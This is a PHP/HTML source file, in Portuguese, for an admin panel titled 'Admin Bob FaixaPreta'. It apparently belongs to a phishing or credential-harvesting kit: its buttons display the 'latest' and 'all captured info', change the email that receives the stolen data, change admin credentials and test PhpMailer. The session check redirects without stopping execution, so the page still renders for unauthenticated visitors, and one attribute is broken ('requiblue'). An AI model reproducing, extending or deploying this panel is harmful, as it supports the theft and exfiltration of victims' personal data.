<?php

error_reporting(0);

ini_set("display_errors", 0 );

session_start();

/*
$usuario = $_SESSION['usuario'];
$senha = $_SESSION['senha'];

if (isset($usuario) !== true and isset($senha) !== true){
   session_destroy();
   header('Location: /admin/login.php');
}
*/

if ($_SESSION['logado'] !== true){
   header('Location: /admin/login.php');
}

if ($_SESSION["continua"] == true){
   // . . . . .
} else {
//   $_SESSION['logado'] = false;
}

$_SESSION["continua"] = false;

?>
<html lang="pt-BR">
<head>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="theme-color" content="#000">
   <style type="text/css">
* {
    padding: 0;
    margin:0;
}

body {
    background-image: url(/admin/imagens/fundo.png);
    background-size: cover;
}

.box1 {
    background-color: rgba(0,0,0,.6);
    padding: 17px;
    margin: 4% 4% 6% 4%;
    text-align: center;
    border-radius: 5px;
}

.titulo {
    text-align: center;
    text-shadow: 3px -3px 8px red;
    font-size: 22px;
    font-weight: 900;
    color: white;
    opacity: 1;
}

hr {
    margin: 10px 5%;
    border-color: red;
}

.input {
    border: 1px solid black;
    background-color: rgba(0,0,0,.7);;
    padding: 5px 10px;
    font-size: 12px;
    cursor: pointer;
    border-color: white;
    border-radius: 5px;
    color: red;
    margin: 5px;
    width: 90%;
    height: 30px;
    text-shadow: 3px -3px 8px red;
    box-shadow: 1px -1px 8px red;
}

.input:focus {
    outline: 0;
    border-color: blue;
}

.btn {
    border: 1px solid black;
    background-color: rgba(0,0,0,.7);;
    padding: 5px 10px;
    font-size: 15px;
    cursor: pointer;
    border-color: white;
    border-radius: 5px;
    color: red;
    margin: 2px;
    width: 90%;
    height: 30px;
    text-shadow: 3px -3px 8px red;
    -webkit-box-shadow: 1px -1px 8px red;
}

.btn:hover {
    background-color: white;
    border-color: black;
    color: black;
}

@media all and (min-width: 600px) {
.input {
    width: 60%;
}
.btn {
    width: 60%;
}
hr {
    width: 60%;
    margin: 10px 20%;
}
}
   </style>
</head>
<body>
   <div class="box1">
      <div class="titulo">
         Admin Bob FaixaPreta
      </div>
      <hr>
      <form method="post" action="/admin/ultimas_info.php">
         <button type="submit" class="btn">
            Mostrar ultimas info capturadas
         </button>
      </form>
      <hr>
      <form method="post" action="/admin/todas_info.php">
         <button type="submit" class="btn">
            Mostrar todas info capturadas
         </button>
      </form>
      <hr>
      <form method="post" action="mudaremail.php" autocomplete="off">
         <input type="text" name="email" value="" class="input" placeholder="Digite o novo e-mail para recebimento" requiblue/>
         <button type="submit" class="btn">
            Mudar e-mail de recebimento
         </button>
      </form>
      <hr>
      <form method="post" action="mudarusuario.php" autocomplete="off">
         <input type="text" name="usuario" value="" class="input" placeholder="Digite o novo usuario" required/>
         <button type="submit" class="btn">
            Mudar usuario do Admin
         </button>
      </form>
      <hr>
      <form method="post" action="mudarsenha.php" autocomplete="off">
         <input type="text" name="senha" value="" class="input" placeholder="Digite a nova senha" required/>
         <button type="submit" class="btn">
            Mudar senha do Admin
         </button>
      </form>
      <hr>
      <form method="post" action="">
         <button type="submit" class="btn">
            Testar PhpMailer
         </button>
      </form>
   </div>
</body>
</html>
